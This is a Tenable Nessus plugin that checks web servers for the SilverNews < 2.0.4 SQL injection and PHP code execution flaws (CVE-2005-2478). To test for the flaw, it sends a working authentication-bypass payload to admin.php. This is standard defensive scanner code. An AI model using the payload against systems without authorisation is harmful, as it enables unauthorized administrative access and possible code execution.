#
# (C) Tenable Network Security
#

include("compat.inc");

if (description) {
  script_id(19398);
  script_version("$Revision: 1.16 $");

  script_cve_id("CVE-2005-2478");
  script_bugtraq_id(14466);
  if (defined_func("script_xref")) script_xref(name:"OSVDB", value:"18517");

  name["english"] = "SilverNews < 2.0.4 Multiple Vulnerabilities";
  script_name(english:name["english"]);
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
multiple flaws." );
 script_set_attribute(attribute:"description", value:
"The remote host is running SilverNews, a free news script written in
PHP. 

The version of SilverNews installed on the remote host suffers from
several flaws :

  - SQL Injection Vulnerability
    The application does not sanitize user-supplied input to the 
    'username' parameter of the 'admin.php' script before using 
    it in database queries. By exploiting this flaw, an attacker
    can bypass authentication and possibly disclose or modify
    data or launch attacks against the underlying database.

  - Arbitrary PHP Code Execution Vulnerability
    The application allows administrators to edit template
    files, which may contain HTML as well as PHP code to be
    used, for example, as footers with dynamically generated
    pages. In conjunction with the SQL injection flaw noted
    above, an attacker can exploit this issue to execute
    arbitrary PHP code on the remote host within the
    context of the web server userid." );
 script_set_attribute(attribute:"see_also", value:"http://www.retrogod.altervista.org/silvernews.html" );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2005-08/0045.html" );
 script_set_attribute(attribute:"solution", value:
"It is believed that the issues are resolved in SilverNews 2.0.4 or
later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();

 
  summary["english"] = "Checks for multiple vulnerabilities in SilverNews < 2.0.4";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);

# Loop through CGI directories.
init_cookiejar();
foreach dir (cgi_dirs()) {
  # Try to call the affected script.
  r = http_send_recv3(method: "GET", item:string(dir, "/admin.php"), port:port);
  if (isnull(r)) exit(0);

  # If it looks like SilverNews...
  if (egrep(string: r[2], pattern:"SilverNews .+ Admin control panel")) {
    if (! isnull(get_http_cookie(name: "s"))) {
      # Try to bypass authentication.
      postdata = raw_string(
        "act=login&",
        "username=", urlencode(str:"' or isnull(1/0) --"), "&",
        "password=", SCRIPT_NAME
      );
      r = http_send_recv3(method: "POST", item: strcat(dir, "/admin.php"),
      	data: postdata, port: port,
	add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"));
      if (isnull(r)) exit(0);

      # There's a problem if we're now logged in.
      if (
        "admin.php?section=settings" >< r[2] ||
        egrep(string:r[2], pattern:"Hello <b>.+admin\.php\?act=logout")
      ) {
        security_hole(port);
	set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
        exit(0);
      }
    }
  }
}
